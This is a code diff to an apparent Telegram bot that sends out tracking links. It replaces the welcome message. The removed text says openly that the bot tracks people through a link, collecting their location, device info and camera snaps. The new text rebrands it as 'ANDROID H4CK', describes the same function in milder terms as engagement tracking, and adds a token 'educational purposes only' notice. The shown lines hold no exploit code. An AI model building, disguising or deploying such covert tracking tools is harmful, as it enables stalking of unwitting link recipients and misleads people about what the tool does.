@@ -73,7 +73,30 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `*🤖 ANDROID H4CK — Return of SHINITA*
+_⚔️ Cosmic Warrior Intelligence Bot ⚔️_
+
+━━━━━━━━━━━━━━━━━━
+👋 *Welcome, ${user}!*
+━━━━━━━━━━━━━━━━━━
+
+This bot helps you generate smart tracking links to analyze user engagement and technical data.
+
+*🔍 Features:*
+• Device & browser detection  
+• Approximate location  
+• Technical visit info  
+• Fast link tracking  
+
+*🛡️ Usage Notice:*
+For educational and security-awareness purposes only.
+
+━━━━━━━━━━━━━━━━━━
+📌 *Get Started*
+Type /help to see all commands.
+━━━━━━━━━━━━━━━━━━
+
+🌌 _ANDROID H4CK — Powering the Cosmic Generation_ 🌌`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
